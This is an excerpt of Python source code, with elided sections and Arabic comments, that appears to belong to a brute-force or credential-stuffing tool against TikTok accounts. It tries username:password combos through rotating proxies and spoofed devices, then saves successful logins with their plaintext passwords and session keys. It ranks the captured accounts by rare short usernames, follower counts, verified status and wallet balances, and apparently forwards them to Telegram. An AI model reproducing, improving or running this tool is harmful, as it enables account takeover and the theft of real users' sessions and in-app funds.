   ...
   'Host': 'webcast22-normal-c-alisg.tiktokv.com',
    ...
    def get_coin(self) -> dict:
        ...
        try:
            ...
            return {"data": {"my_wallet": {"withdrawal_money": 0, "diamond_count": 0}}}
...
class ThreadsHandler:
    ...
    def __brute_account(self):
        ...
        def save_and_notify(file_name, data, counter=None, extra_data=""):
            ...
            if file_name not in ["all.txt", "Level_Acc.txt", "sessions.txt"] and self.tele:
        ...
        while not self.combos_queue.empty():
            ...
            try:
                ...
                # جلب معلومات المستخدم للهيتس دائماً مثل ما يحدث في السكيور
                try:
                    userid = login_data['data']['username']
                    proxy = random.choice(self.proxies)
                    devicee = random.choice(self.dev)
                    device = (devicee.split(":")[1], devicee.split(":")[0], devicee.split(":")[2], 
                             devicee.split(":")[3], f'{random.randint(7, 33)}.{random.randint(0, 9)}.{random.randint(0, 9)}',
                             devicee.split(":")[5], devicee.split(":")[4])
                    
                    ses = login_data['data']['session_key']
                    
                    # جلب معلومات المستخدم إذا لم تكن متوفرة أو كانت فارغة
                    if not follow or follow == "":
                        info = Api(device, proxy, userid, ses).get_userinfo()
                        follow = info[0]
                        verified_from_info = info[1]
                        uid = info[2]
                        heart = info[3]
                        country_name = info[4]
                        level = Api(device, proxy, userid, ses).Get_level(uid)
                    
                    # جلب معلومات العملات دائماً
                    if not coin or coin == {}:
                        coin = Api(device, proxy, userid, ses).get_coin()
                    
                except Exception as e:
                    print(f"Error getting user info for hit: {e}")
                    if not follow:
                        follow = "N/A"
                    if not heart:
                        heart = "N/A"
                    if not level:
                        level = "N/A"
                    if not coin:
                        coin = {"data": {"my_wallet": {"withdrawal_money": 0, "diamond_count": 0}}}

                # تنسيق البيانات للهيتس
                end_data = (
                    f"HIT | @{login_data['data']['username']} | {username}:{password} | "
                ...
                if len(str(login_data['data']['username'])) == 4:
                    save_and_notify("4Ls.txt", end_data)
                    self.users_4l += 1

                # Save accounts with 3-letter usernames
                if len(str(login_data['data']['username'])) == 3:
                    save_and_notify("3Ls.txt", end_data)
                    self.users_3l += 1

                # Save accounts with 1-2 letter usernames
                if 0 < len(str(login_data['data']['username'])) < 3:
                   save_and_notify("1-2Ls.txt", end_data)
                   self.users_2l += 1

                # التحقق من المتابعين والحفظ في الفئات المناسبة
                if str(follow).isdigit():
                    followers_count = int(follow)
                    
                    # Save accounts with <1k followers
                    if followers_count < 1000:
                        save_and_notify("0k-1k.txt", end_data)
                        self.followers_0k += 1
                        with open(f"{self.results_path}/sessions.txt", "a") as f:
                            f.write(f"{login_data['data']['session_key']}\n")

                    # Save accounts with 1k-9k followers
                    elif 1000 <= followers_count < 10000:
                        save_and_notify("1k-9k.txt", end_data)
                        self.followers_1k += 1

                    # Save accounts with 10k-99k followers
                    elif 10000 <= followers_count < 100000:
                        save_and_notify("10k-99k.txt", end_data)
                        self.followers_10k += 1

                    # Save accounts with 100k-999k followers
                    elif 100000 <= followers_count < 1000000:
                        save_and_notify("100k-999k.txt", end_data)
                        self.followers_100k += 1

                    # Save accounts with 1M+ followers
                    elif followers_count >= 1000000:
                        save_and_notify("1M+.txt", end_data)
                        self.followers_1M += 1
                else:
                    # استخدام الطريقة القديمة إذا لم يكن الرقم صالح
                    if len(str(follow)) < 4:
                        save_and_notify("0k-1k.txt", end_data)
                        self.followers_0k += 1
                        with open(f"{self.results_path}/sessions.txt", "a") as f:
                ...
                if str(login_data['data']['user_verified']) != "False":
                    save_and_notify("verified.txt", end_data)
                    self.is_verified += 1

                # معالجة معلومات العملة والمال
                try:
                    if coin and 'data' in coin and 'my_wallet' in coin['data']:
